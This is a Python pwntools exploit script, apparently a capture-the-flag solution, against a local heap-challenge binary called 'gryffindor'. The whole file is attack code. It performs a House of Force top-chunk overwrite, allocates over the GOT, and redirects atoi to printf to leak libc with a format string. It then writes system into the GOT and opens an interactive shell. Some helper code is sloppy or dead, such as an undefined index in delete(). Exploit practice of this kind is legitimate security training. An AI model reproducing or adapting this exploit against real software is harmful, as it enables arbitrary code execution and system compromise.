from pwn import *

r = process("./gryffindor")

#given heap leak
#try to get a libc leak
#relro is partial thus try to allocate a chunk there

def add(size,idx):
	print(r.sendlineafter(">>", str(1)))
	print(r.sendlineafter("Enter size of input\n",str(size)))
	print(r.sendlineafter("Enter index\n",str(idx)))

def delete():
	r.sendlineafter(">>",str(2))
	print(r.sendlineafter("Enter index\n",str(idx)))

def edit(idx,size,content):
	r.sendlineafter(">>",str(3))
	print(r.sendlineafter("Enter index\n",str(idx)))
	r.sendlineafter("Enter size\n",str(size))
	r.sendline(content)
	print(r.recvline())
	#recv input
def exit():
	r.sendafter(">>",str(4))


#heap leak
r.sendlineafter(">>",str(1337))
heap_base = int(r.recvline().strip(),16)

#finding addr for new top chunk
top_chunk = heap_base + 0x140
print("current top_chunk {}",hex(top_chunk))
free_got = 0x000000000602018
niceguy = 0x6020c0
printf_plt = 0x4006c0
atoi_got = 0x000000000602068
#new_block = free_got-top_chunk-0x10
new_block = atoi_got - top_chunk -0x10-0x10

#overwriting the top chunk
add(0x20,0)
payload = 'a'*0x20+'b'*8+p64(0xffffffffffffffff)
edit(0,0x40,payload)

#allocating chunk
print(hex(new_block))

print(r.sendlineafter(">>", str(1)))
print(r.sendlineafter("Enter size of input\n",str(new_block)))
print(r.sendlineafter("Enter index\n",str(1)))

#getting the libc leak
payload = '\x00'*24+p64(printf_plt)+p64(printf_plt)
print(r.sendlineafter(">>", str(1)))

print(r.sendlineafter("Enter size of input\n",str(48)))
print(r.sendlineafter("Enter index\n",str(2)))
r.sendlineafter(">>",str(3))
print(r.sendlineafter("Enter index\n",str(2)))
r.sendlineafter("Enter size\n",str(0x40))
r.sendline(payload)
print(r.recvline())
r.sendlineafter(">>","%7$p")
print("leak:")
libc_leak = ((r.recvuntil("\n").strip()[0:])[:-1])+'0'
libc_leak = int(libc_leak,16)
print(hex(libc_leak))
libc_base = libc_leak - 0x6f7f0
system = libc_leak - 0x2a460

payload = '\x00'*24+p64(system)+p64(printf_plt)

r.sendlineafter(">>",str('  '))
print(r.sendlineafter("Enter index\n",str(' ')))
p = ' '*31
print(r.recvuntil("Enter size\n"))
r.sendline(p)
r.sendline(payload)

#print(r.recvline())
#r.sendline(payload)'''
#gdb.attach(r)

#r.sendline(payload)


#print(r.sendlineafter("Enter index\n",str(11111)))

#writing system
#r.sendlineafter(">>",str(3))
#print(r.sendlineafter("Enter index\n",str(idx)))
#r.sendlineafter("Enter size\n",str(size))
#r.sendline(content)
#print(r.recvline())

r.interactive()


#delete()




#print(hex(leak))
#leak = u64(r.recvline().strip().ljust('\x00',4))
#print(hex(leak))



